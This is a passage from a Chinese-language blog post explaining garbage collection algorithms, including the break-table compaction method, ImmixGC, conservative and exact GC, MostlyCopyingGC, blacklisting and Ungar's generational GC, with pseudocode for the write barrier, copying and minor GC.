new_address：替代了之前forwarding指针的作用，返回移动后活动对象的地址。</span></span><br><span class="line"><span class="built_in">new_address</span>(obj)&#123;</span><br><span class="line"> best_entry = <span class="built_in">new_bt_entry</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span>(entry : break_table)</span><br><span class="line"> <span class="keyword">if</span>(entry.address &lt;= obj &amp;&amp; $best_entry.address &lt; entry.address)</span><br><span class="line"> best_entry = entry</span><br><span class="line"> <span class="keyword">return</span> obj - best_entry.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929163403692.png" alt="image-20210929163403692"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929163424575.png" alt="image-20210929163424575"></p><p>【优点】不需要forwarding 指针，因为它利用了间隙表格来存储相关的信息。但是间隙表格需要准备两个单位的空间来存放对象群信息。</p><p>【优点】因为相较于于Two-Finger算法的压缩过程保留对象顺序，所以可以利用引用对象缓存优势提高对象的访问速度。</p><p>【缺点】要维持间隙表格需要付出很高的代价，因为每次移动活动对象群都要进行表格的移动和更新。</p><p>【缺点】在更新指针时也不能忽略搜索表格所带来的消耗。在更新指针前，如果先将表格排序，则表格的搜索就能高速化。不过排序表格也需要相应的消耗，所以并不能从根本上解决问题。</p><h5 id="ImmixGC算法"><a href="#ImmixGC算法" class="headerlink" title="ImmixGC算法"></a><strong>ImmixGC</strong>算法</h5><p>该算法比较复杂，而且也相对比较新，是Stephen M. Blackburn 和 Kathryn S. McKinley 于 2008 年研究出来的，据说论文的作者把这个算法实现到了 JikesRVM（Research Virtual Machine）A 的内存管理软件包 MMTk（Memory Management Toolkit）中。</p><h6 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h6><p>ImmixGC 把堆分为一定大小的“块”（block），再把每个块分成一定大小的“线”（line）。这个算法不是以对象为单位，而是以线为单位回收垃圾的。分配时程序首先寻找空的线，然后安排对象。没找到空的线时就执行 GC。</p><p>GC 分为以下 3 个步骤执行：（1）选定备用的 From 块。（2）搜索阶段.（3）清除阶段。</p><p>不过该算法不是每次都执行步骤 （1） 的。在 ImmixGC 中，只有在堆消耗严重的情况下，为了分配足够大小的chunk时才会执行压缩。此时会通过步骤 1 来选择作为压缩对象的备用块（备用的 From 块）。</p><p>接下来，在步骤 （2） 中从根搜索对象，根据对象存在于何种块里来分别进行标记操作或复制操作。具体来说，就是对存在于步骤 1 中选择的备用 From 块里的对象执行复制操作，对除此之外的对象进行标记操作。</p><p>步骤 （3） 则是寻找没有被标记的线，按线回收非活动对象。</p><p>以上就是 ImmixGC 的概要。</p><h6 id="堆的构成"><a href="#堆的构成" class="headerlink" title="堆的构成"></a>堆的构成</h6><p>ImmixGC 中把堆分成块，把每个块又分成了更小的线。据论文中记载，块最合适的大小是 32K 字节，线最合适的大小是 128 字节。我们在此就直接引用论文中的数值。这样一来，每个块就有 32×1024÷128 ＝ 256 个线。</p><p>各个块由以下 4 个域构成。</p><p>• line</p><p>• mark_table</p><p>• status</p><p>• hole_cnt</p><p>打个比方，用 $block[i].status 就可以访问位于第 i 号块的 status 域。</p><p> <code>line</code>： line 就跟它的名字一样，是每个块的线，线里会被安排对象。$block[i].line[j] 表示的就是第 i 号块的第 j 号线。</p><p><code>mark_table</code>：mark_table 则是与每个线相对应的用于标记的位串。打个比方，与第 i 号块的第 j 号线相对应的用于标记的位串就是 $block[i].mark_table[j]。我们分给 mark_table[j] 一个字节，在标记或分配下面的某个常量时，将其记录在 mark_table[j] 中。</p><ul><li> FREE（没有对象）</li><li> MARKED（标记完成）</li><li> ALLOCATED（有对象）</li><li> CONSERVATIVE（保守标记）</li></ul><p><code>status</code>：status 是用于表示每个块中的使用情况的域。我们也分给 status 一个字节，在执行GC 或分配时，记录下面的某个常量。</p><ul><li><p> FREE（所有线为空）</p></li><li><p> RECYCLABLE（一部分线为空）</p></li><li><p>UNAVAILABLE（没有空的线）</p><p> 初始状态下所有块都是 FREE</p></li></ul><p><code>hole_cnt</code>：hole_cnt 负责记录各个块的“孔”（hole）数。这里所说的孔拥有连续的大于等于 1 个的空的线。我们用这个 hole_cnt 的值作为表示碎片化严重程度的指标。如果某个chunk的hole_cnt 的值很大，它就很可能被标记为备用From空间，从而使用GC复制算法来进行处理。而hole_cnt 较小的chunk则由GC标记-清除算法进行处理。</p><p>下面的图表示了使用ImmixGC算法的堆情况：</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922184010310.png" alt="image-20210922184010310"></p><h6 id="分配过程"><a href="#分配过程" class="headerlink" title="分配过程"></a>分配过程</h6><p>分配的整体过程如下图所示，核心在于判断mark_table的状态，当mark_table标记为Free才在这个line中分配内存。当然这个过程也会可能会更新chunk的hole_cnt以及status。</p><p>分配过程采取了保守标记，考虑到小型对象可能会占据 line[i+1] 的 情 况，当 mark_table[i+1] 是FREE 时，把 它 定 为 CONSERVATIVE。这 里 的 CONSERVATIVE 的 意 思 是“如 果 小 型 对 象 占 据了 line[i+1]，则 mark_table[i+1] 可能会包含所分配对象的后半部分”（例如图 (a) 的$block[0].line[4] 这样的情况）。不过之后在 line[i+1] 进行分配的时候，要事先将 mark_table[i+1] 的值从 CONSERVATIVE 改写成 ALLOCATED。</p><p>这样保守的标记在标记阶段是很有用的。在标记阶段中，每次搜索对象都必须检查这个对象是否占据了其他的线，为此程序每次都要调查对象的大小，因为要调查所有活动对象，所以这项处理就带来了额外的负担。为了省去这项处理，我们才采取了较为保守的做法，即事先对小型对象打上 CONSERVATIVE这个标记。因为程序中要频繁用到小型对象，所以这个办法是非常有效的。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922184949063.png" alt="image-20210922184949063"></p><h6 id="GC过程"><a href="#GC过程" class="headerlink" title="GC过程"></a>GC过程</h6><p><strong>步骤 1—选定备用From块</strong></p><p>资料上面给的过程比较详细，需要很长时间才能理解操作的本质以及这样做的意义。经过本人的理解，将其精炼为我自己的看法。</p><p>首先统计以hole_cnt维度的FREE线以及非FREE线的总数，得到类似于下面的表。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922185839306.png" alt="image-20210922185839306"></p><p>这里的require 是备用 From 块里非 FREE 线的总数，available 是除了备用 From 块以外的块所持有的 FREE 线的总数。简单来说就是评价孔数维度chunk是否释放的权重。（这里并非单个chunk最大孔数就为6孔了，而是为了举例理解该算法的思想。）</p><p>因为status 为FREE的块里面全部为FREE线，所以假设这张表有两个FREE块，此时这两个FREE块的FREE线则为256 * 2 == 512个。</p><p>此时available == 512 + 10 + 29 + 49 + 41 + 36 + 40 == 717 。我们判断require 与available 权重的方式就是直观的比大小。接下来计算出require &gt; available 孔的数量。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922190520258.png" alt="image-20210922190520258"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922190528333.png" alt="image-20210922190528333"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922190539045.png" alt="image-20210922190539045"></p><p>经过上面的图发现当hole_cnt为4的时候，require &gt; available 。所以当hole_cnt &gt; 4的所有chunk将被设置为备用FREE空间，交由GC复制算法来处理。</p><p><strong>步骤2—搜索阶段</strong></p><p>搜索阶段要从根开始搜索对象，根据对象分别进行标记处理或复制处理。这里的复制处理指的是将备用 From 块里的对象复制到别的块（To 块），并进行压缩。</p><p>在搜索阶段中，如果搜索到的对象在备用 From 块里，那么就会进行复制操作，如果在别的块里，就会执行标记操作。</p><p><strong>步骤3—清除阶段</strong></p><p>清除阶段判断mark_table[i] 的值，如果是FREE 或 ALLOCATED，则 line[i] 里就有两种情况 —没有对象或只有垃圾，因此这个线就能被回收再利用了。</p><p> 当mark_table[i] 的值为 CONSERVATIVE 时，可能line[i-1] 里的对象有可能也占据了 line[i] 的空间 。如果 line[i-1] 的对象都是非活动对象，就可以将 line[i] 进行回收再利用。但是即使line[i-1] 只有一个活动对象，这个对象也有可能占据 line[i] 的空间，所以这时就不能将line[i] 进行回收再利用了。</p><p>【优点】利用线这个结构进行管理，线比块的范围小但比对象的范围大。（兼顾了效率与处理难度）</p><p>【优点】由于备用From空间的存在，碎片化严重的块可以通过GC复制算法将活动对象进行压缩。</p><p>【缺点】对象不是按顺序保存的，不能很好的利用缓存。</p><p>【缺点】由于我们曾经做过保守的标记，有些没有活动对象的线有可能无法被回收。致使堆使用效率降低。</p><p>总体来说，该算法仍然是一种比较优秀的算法。</p><h3 id="保守式GC（Conservative-GC）"><a href="#保守式GC（Conservative-GC）" class="headerlink" title="保守式GC（Conservative GC）"></a>保守式GC（Conservative GC）</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h4><p>GC有两个种类，分别为“保守式 GC”和“准确式 GC”。保守式 GC指的是“不能识别指针和非指针的 GC”（因为存在不明确的根（寄存器、调用栈、全局变量空间），里面存放的可能是指针也可能是数据）。</p><p>存在貌似指针的非指针：当基于不明确的根运行 GC 时，偶尔会出现非指针和堆里的对象的地址一样的情况，这时 GC 就无法识别出这个值是非指针。如下图，这种情况很危险。在GC的时候即使这个对象真的用不到了也不会被回收，因为被错误识别成指针的数据指向了这个对象。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923095214383.png" alt="image-20210923095214383"></p><p>不明确的数据结构：类似下面的联合体，GC不能识别出这块空间是指针还是数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line"> <span class="keyword">long</span> n;</span><br><span class="line"> <span class="keyword">void</span> *ptr;</span><br><span class="line">&#125; ambiguous_data;</span><br></pre></td></tr></table></figure><h4 id="评估-4"><a href="#评估-4" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h5><ol><li><code>实现容易</code>：编写程序设计语言的处理程序（编译器，解释器）可以花比较少的时间在GC上。</li></ol><h5 id="缺点-4"><a href="#缺点-4" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>识别指针和非指针需要付出成本</code>：需要消耗计算机资源来识别不明确的根和数据结构的值为“指针”还是“非指针”。</li><li><code>错误识别指针会压迫堆</code>：当识别错误时会降低堆空间利用率，不断挤压蚕食堆空间。</li><li><code>GC算法的选择有限制</code>：基本上不能使用 GC 复制算法等移动对象的 GC 算法。因为如果将对象移动到新空间，被错误识别成指针的数据也会被修改为新的值（此时该值为新对象的地址）。</li></ol><p>总之缺点大于优点，建议使用准确式GC来作为GC模式。</p><h4 id="准确式GC"><a href="#准确式GC" class="headerlink" title="准确式GC"></a>准确式GC</h4><p>准确式 GC（Exact GC）和保守式 GC 正好相反，它是能正确识别指针和非指针的 GC。创建正确的根的方法有很多种，不过这些方法有个共通点，就是需要“语言处理程序的支援”，所以正确的根的创建方法是依赖于语言处理程序的实现的。下面是几种比较常用的方法。</p><ol><li><p><code>打标签</code>：一个例子是在低一位打标签。v8就是这么干的。做法是把非指针（int等）向左移动 1 位（a &lt;&lt; 1），将低 1 位置位（指针设置为1，数据不用动）。移位要注意不要让数据溢出。处理数据时先将其右移移位进行运算，等到操作完成该数据后再将其左移回去。基本上打标签和取消标签的操作都是由语言处理程序执行的。</p></li><li><p><code>不把寄存器和栈等当作根</code>：前提条件是创建一个正确的根，这个正确的根在处理程序里只集合了 mutator可能到达的指针，然后以它为基础来执行 GC。Example，当语言处理程序采用 VM（虚拟机）这种构造时，有时会将 VM 里的调用栈和寄存器当作正确的根来使用。</p></li></ol><p>【优点】保守式GC的缺点在这里都得到了解决。</p><p>【缺点】同样保守式的优点也是它的缺点，也就是实现困难。</p><p>【缺点】打标签的方式可能会影响程序整体的运行速度。</p><h4 id="优化措施-4"><a href="#优化措施-4" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a>间接引用</h5><p>解决的是<code>GC算法的选择有限制</code>的问题，使用该技术就可以使用GC复制算法了。间接引用实际上就是加了一个中间层。由于加了一个中间层，当对象移动时，中间层的值进行了修改，而根始终指向中间层，根的值并没有做任何更改。</p><p>【优点】可以使用类似于GC复制算法等移动对象的算法了，可选择性多了。</p><p>【缺点】因为必须将所有对象都（经由句柄）间接引用，所以会拉低访问对象内数据的速度，这会关系到整个语言处理程序的速度。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923103949964.png" alt="image-20210923103949964"></p><h5 id="MostlyCopyingGC"><a href="#MostlyCopyingGC" class="headerlink" title="MostlyCopyingGC"></a>MostlyCopyingGC</h5><h6 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h6><p>这是1989 年 诞生的一个保守式 GC 复制算法。这个算法能在不明确的根的环境中运行 GC 复制算法。堆被分成若干个一定大小的页。页有三种形式。如下图：</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104729380.png" alt="image-20210923104729380"></p><p>OBJECT表示正在使用的页，CONTINUED表示当正在使用的页跨页时将被设置在第2个页之后，没有标志的表示空白页。</p><p>默认一个新的堆中全部是空白页，申请小对象基本只会分配在已有的OBJECT页或者新建的OBJECT页；而申请大对象基本会新建OBJECT页和CONTINUED页。</p><h6 id="分配过程-1"><a href="#分配过程-1" class="headerlink" title="分配过程"></a>分配过程</h6><p>如果正在使用的页里有符合 mutator 申请的对象大小的chunk，对象就会被分配到这个页。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104644245.png" alt="image-20210923104644245"></p><p>如果当正在使用的页里没有大小充足的chunk时，对象就会被分配到空的页，然后正在使用的这个新页会被设置 OBJECT 标志。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104701966.png" alt="image-20210923104701966"></p><p>当 mutator 要求大对象时，分配程序会将对象跨多个页来分配。在跨多个页分配时，和平时的分配一样，也会在开头的页设定OBJECT，然后在第 2 个页之后设置 CONTINUED 标志。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104729380.png" alt="image-20210923104729380"></p><h6 id="GC过程-1"><a href="#GC过程-1" class="headerlink" title="GC过程"></a>GC过程</h6><p>初始状态，这里的$current_space是From页的编号，$next_space是To页的编号，此时二者相同。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111112352.png" alt="image-20210923111112352"></p><p>将从根引用的对象的页“晋升”（promotion）到 To 页，此时$next_space发生了改变，目的是为了区分标记From页和To页。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111140560.png" alt="image-20210923111140560"></p><p>接着还是按照由根到堆的顺序将From页的活动对象复制到To页。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111419480.png" alt="image-20210923111419480"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111507354.png" alt="image-20210923111507354"></p><p>将 To 页里的所有子对象复制完毕后，GC 就结束了。这时程序会将 $current_space 的值设定为 $next_space 的值。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111537022.png" alt="image-20210923111537022"></p><p>不过此时垃圾对象 X、Y、D 都没有被回收（因为Y不能被任何指针索引到，而D由Y索引，所以二者都是垃圾对象）。实际上这就是 MostlyCopyingGC的特殊之处。它不会回收包含有从根指向的对象（图中的 A）的页里的垃圾对象，而且也不会回收这个垃圾对象所引用的对象群。举个极端的例子，如果所有的页里都有从根引用的对象，那么所有的垃圾都不能被回收。</p><p>这个缺点可以通过调整页大小得到改善。如果缩小页，那么即使页里的对象是从根引用的，我们也能把损失降到最低。不过如果页太小了，就会增加页总数，增大分配和 GC 所需要的成本。所以将页调整到合适大小是非常关键的。据文献 [17] 记载，有试验结果表明页的合适大小在 512 字节。</p><p>【优点】能在保守式 GC 里使用 GC 复制算法。兼顾了保守式GC（实现简单）和GC复制算法的优点。</p><p>【缺点】也同样由GC复制算法的缺点，还有一个特有缺点是在包含有从根引用的对象的页内，所有的对象都会被看成活动对象。也就是说，垃圾对象也会被看成活动对象，这样一来就拉低了内存的使用效率。</p><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><p>处理的是<code>错误识别指针会压迫堆</code>的问题，通过黑名单标记可能存在问题的内存，减小其带来的危害（但不能消除）。</p><p>在指针的错误识别中，当被错误判断为活动对象的那些垃圾对象的大小过大以及子对象过多时，造成的危害会相对来说比较大。而当其垃圾对象的大小比较小而且该对象没有子对象时，造成的危害会比较小。</p><p>基于这一点，黑名单就是一种创建“需要注意的地址的名单”的方法。这个黑名单里记录的是“不明确的根内的非指针，其指向的是有可能被分配对象的地址”。我们将这项记录操作称为“记入黑名单”。黑名单里记录的是“需要注意的地址”。一旦分配程序把对象分配到这些需要注意的地址中，这个对象就很可能被非指针值所引用。也就是说，即使分配后对象成了垃圾，也很有可能被错误识别成“它还活着”。所以我们在黑名单中的内存可以分配上述提到的大小比较小且没有子对象的对象，这样为如果这样的对象成了垃圾，即使被错误识别了，也不会有什么大的损失。说白了就是风险最小化。</p><p>【优点】可以缓解<code>错误识别指针会压迫堆</code>的问题。堆的使用效率页得到了提升。</p><p>【缺点】分配对象时需要检查黑名单，需要花费一定的时间。</p><p>无法判断该技术是否好用，具体是否应用该技术取决于工程实际测试时表现的性能。</p><h3 id="分代垃圾回收（Generational-GC）"><a href="#分代垃圾回收（Generational-GC）" class="headerlink" title="分代垃圾回收（Generational GC）"></a>分代垃圾回收（Generational GC）</h3><h4 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h4><p>分代垃圾回收中把对象分类成几代，针对不同的代使用不同的 GC 算法，我们把刚生成的对象称为新生代对象，到达一定年龄的对象则称为老年代对象。我们将对新对象执行的 GC 称为新生代 GC（minor GC）。将面向老年代对象的 GC 称为老年代 GC（major GC）。</p><p>分代垃圾回收，基于的是“<strong>大部分的对象，在生成后马上就会变成垃圾</strong>”这一经验上的事实为设计出发点。</p><h4 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h4><p>这里介绍下<strong>Ungar</strong>的分代垃圾回收，它是由 David Ungar 研究出来的把 GC 复制算法和分代垃圾回收这两者组合运用的方法。</p><p>堆结构如下。两个幸存空间可以分成From幸存空间和To幸存空间，生成空间和From幸存空间都会使用类似于GC复制算法将活动对象拷贝到To空间，之后进行From幸存空间和To幸存空间的swap。可能会出现To幸存空间可能不能承载所有活动对象的任务（这种情况可能比较少，因为新生代对象的定义就是生命比较短的对象），这时就会临时将老年代空间当作承载容器。只有达到一定年龄的对象才会被移动到老年代空间中。老年代空间满了之后会执行GC标记-清除算法。这时可能会出现老年代对象指向新生代对象的情况。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210924141654564.png" alt="image-20210924141654564"></p><p>对于新生代对象的索引有三种情况：根索引、新生代对象索引、老年代对象索引。分代垃圾回收的优点是只将垃圾回收的重点放在新生代对象身上，以此来缩减 GC 所需要的时间。不过考虑到从老年代对象的引用，结果还是要搜索老年代堆中的所有对象，这样一来就大大削减了分代垃圾回收的优势。这时我们可以维护一个列表来维护从老年代指向新生代的对象，这个列表就叫做记录集。写入记录集之前会判断该对象是否在老年代且指向的对象是否在新生代，该对象是否没有保存在记录集中（通过标志位remembered来判断），如果都满足条件则将该对象的索引写入记录集中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write_barrier：写入记录集。</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, new_obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj &gt;= $old_start &amp;&amp; new_obj &lt; $old_start &amp;&amp; obj.remembered == FALSE)</span><br><span class="line"> $rs[$rs_index] = obj</span><br><span class="line"> $rs_index++</span><br><span class="line"> obj.remembered = TRUE</span><br><span class="line">     </span><br><span class="line"> *field = new_obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>对象头</code>包含了很多东西，有常规的对象的种类和大小，还有</p><ul><li>对象的年龄（age）：只在新生代对象头，如果年龄到达阈值则进入老年代。</li><li>对象是否已经被复制过（forwarded）：只在新生代对象头，防止复制相同对象。</li><li>是否被记录集记录（remembered）：只再老年代对象头，防止重复再记录集记录。</li></ul><p>对象还有个forwarding指针，obj.forwarding，指向了要复制的空间。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：主要逻辑就是复制内存，移动指针。和GC复制算法很像。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($new_free + size &gt;= $survivor1_start)</span><br><span class="line"> <span class="built_in">minor_gc</span>()</span><br><span class="line"> <span class="keyword">if</span>($new_free + size &gt;= $survivor1_start)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj = $new_free</span><br><span class="line"> $new_free += size</span><br><span class="line"> obj.age = <span class="number">0</span></span><br><span class="line"> obj.forwarded = FALSE</span><br><span class="line"> obj.remembered = FALSE</span><br><span class="line"> obj.size = size</span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy：根据对象的年龄来决定将对象复制到新生代空间还是老年代空间。</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.forwarded == FALSE)</span><br><span class="line"> <span class="keyword">if</span>(obj.age &lt; AGE_MAX)</span><br><span class="line"> <span class="built_in">copy_data</span>($to_survivor_free, obj, obj.size)</span><br><span class="line"> obj.forwarded = TRUE</span><br><span class="line"> obj.forwarding = $to_survivor_free</span><br><span class="line"> $to_survivor_free.age++</span><br><span class="line"> $to_survivor_free += obj.size</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">promote</span>(obj)</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// promote：年龄到达指定大小即可今生至老年代，之后判断该对象指向的对象是否在新生代，若是则将其地址存放在记录集中。</span></span><br><span class="line"><span class="built_in">promote</span>(obj)&#123;</span><br><span class="line"> new_obj = <span class="built_in">allocate_in_old</span>(obj)</span><br><span class="line"> <span class="keyword">if</span>(new_obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">major_gc</span>()</span><br><span class="line"> new_obj = <span class="built_in">allocate_in_old</span>(obj)</span><br><span class="line"> <span class="keyword">if</span>(new_obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj.forwarding = new_obj</span><br><span class="line"> obj.forwarded = TRUE</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(new_obj))</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> $rs[$rs_index] = new_obj</span><br><span class="line"> $rs_index++</span><br><span class="line"> new_obj.remembered = TRUE</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// minor_gc：新生代GC，上半部分通过根遍历所有新生代对象进行复制，下半部分遍历记录集来复制来自老年代指针指向的新生代对象。</span></span><br><span class="line"><span class="built_in">minor_gc</span>()&#123;</span><br><span class="line"> $to_survivor_free = $to_survivor_start</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="keyword">if</span>(*r &lt; $old_start)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r)</span><br><span class="line">     </span><br><span class="line"> i = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(i &lt; $rs_index)</span><br><span class="line"> has_new_obj = FALSE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>($rs[i]))</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> has_new_obj = TRUE</span><br><span class="line"> <span class="keyword">if</span>(has_new_obj == FALSE)</span><br><span class="line"> $rs[i].remembered = FALSE</span><br><span class="line"> $rs_index--</span><br><span class="line"> <span class="built_in">swap</span>($rs[i], $rs[$rs_index])</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> i++</span><br><span class="line">     </span><br><span class="line"> <span class="built_in">swap</span>($from_survivor_start, $to_survivor_start)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="评估-5"><a href="#评估-5" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h5><ol><li><code>提高了吞吐量</code>：基于“很多对象年纪轻轻就会死”的理论。通过分代的方式快速处理了大部分对象，而难以变为垃圾的老年代对象也没有必要频繁的进行GC访问。</li></ol><h5 id="缺点-5"><a href="#缺点-5" class="headerlink" 